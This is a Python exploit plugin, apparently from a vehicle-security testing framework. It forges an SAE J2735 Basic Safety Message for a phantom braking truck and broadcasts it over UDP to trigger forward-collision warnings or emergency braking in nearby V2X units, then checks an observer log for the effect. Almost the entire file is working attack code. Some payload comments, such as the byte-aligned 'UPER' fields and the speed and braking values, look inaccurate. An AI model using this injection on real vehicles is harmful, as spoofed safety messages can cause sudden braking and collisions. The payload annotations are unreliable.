"""
PoC Name: V2X BSM Message Injection
Identifier: CWE-345
Component: Multiple
Category: Advanced
Severity: High
CVSS: 7.5
Description: 伪造V2X BSM消息注入虚假车辆位置和速度信息
Prerequisites: 与 OBU 处于同一局域网(基于UDP的车载DSRC路由)，或本机配备专用 C-V2X (PC5) 或 DSRC (802.11p) 射频模块。默认使用 UDP 端口 5000进行测试播发。
E_V2X_BSM_Injection.py <target_ip_or_broadcast>
"""
import sys
import time
import socket
import os
import re
from iv_plugin_base import IVIVulnerabilityPlugin

class V2XBSMInjectionPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-ADV-005"
    meta_poc_name = "V2X BSM Injection"
    meta_cve_id = "CWE-345"
    meta_severity = "High"
    meta_protocol = "rf"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        self.bind_ip = self.params.get("target_ip", "255.255.255.255")
        self.observer_file = self.params.get("observer_file")
        self.success_regex = self.params.get("success_regex", r"FCW|AEB|Forward Collision|Emergency Brake")
        self.observe_seconds = float(self.params.get("observe_seconds", 3))
        if self.bind_ip == "N/A":
             self.bind_ip = "255.255.255.255"
        return True

    def _read_observer_tail(self, path):
        if not path or not os.path.exists(path):
            return ""
        with open(path, "r", encoding="utf-8", errors="ignore") as handle:
            return handle.read()

    def exploit(self):
        self.logger.info("准备发起 V2X BSM 幽灵车辆碰撞欺骗攻击 (SAE J2735)...")
        
        # J2735 BSM 结构 (UPER编码的 ASN.1)
        # BSM Msg ID 是 20 (0x14)，结构包含车辆位置、速度、加速度、方向盘转角、车辆尺寸等
        # 这里是一段经过 UPER 预编码的合法 BSM Payload (十六进制)
        # 代表了一辆距离极近、极速驶来、且正在紧急刹车的“幽灵车”
        
        bsm_hex = (
            "0014"         # MessageFrame -> BSM (20)
            "20202020"     # tempID (随机产生，代表车辆ID)
            "0000"         # secMark (0 ms)
            "1bc2a13f"     # lat (纬度: 特定测试场)
            "4bd0c5eb"     # long (经度: 特定测试场)
            "0f80"         # elevation (未知)
            "07"           # PositionalAccuracy
            "0000"         # transmission state
            "1fff"         # speed (极快，8191 * 0.02 m/s)
            "03e8"         # heading (某个角度)
            "0000"         # angle (0)
            "00000000"     # accelSet (四维加速度，均设定为极性刹车值)
            "0c"           # brakes (全部踩下, ABS 激活, 防滑激活)
            "0f28"         # size (长度与宽度: 大型车辆)
        )
        malicious_bsm = bytes.fromhex(bsm_hex)
        
        self.logger.info(f"成功构造高危 BSM 报文 (UPER 编码): {len(malicious_bsm)} bytes。将模拟幽灵重卡紧急制动！")
        
        v2x_port = 5000 # 很多 V2X 实验设备 OBU 读取 UDP V2X Payload 的默认端口
        
        try:
            pre_observer = self._read_observer_tail(self.observer_file)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            
            self.logger.info(f"开始向 {self.bind_ip}:{v2x_port} 发送恶意 BSM 报文 (安全 PoC 模式，仅发 3 帧)...")
            
            # SAE 标准 BSM 发送频率通常为 10Hz
            for i in range(3):
                sock.sendto(malicious_bsm, (self.bind_ip, v2x_port))
                time.sleep(0.1)

            time.sleep(self.observe_seconds)
            post_observer = self._read_observer_tail(self.observer_file)
            new_content = post_observer[len(pre_observer):] if post_observer.startswith(pre_observer) else post_observer
            if new_content and re.search(self.success_regex, new_content, flags=re.IGNORECASE):
                return {
                    "status": "success",
                    "vulnerable": True,
                    "details": f"Observer evidence matched /{self.success_regex}/ after BSM injection: {new_content[-200:]}",
                }
            
            return {
                "status": "success",
                "vulnerable": False,
                "details": "BSM injection transmitted, but no observer_file evidence matched the configured trigger regex."
            }

        except Exception as e:
            self.logger.error(f"V2X 报文播发异常 (UDP Socket 错误): {e}")
            return {"status": "error", "vulnerable": False, "details": str(e)}
        finally:
             sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("E_V2X_BSM_Injection.py <target_ip_or_broadcast>")
        sys.exit(1)
    plugin = V2XBSMInjectionPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
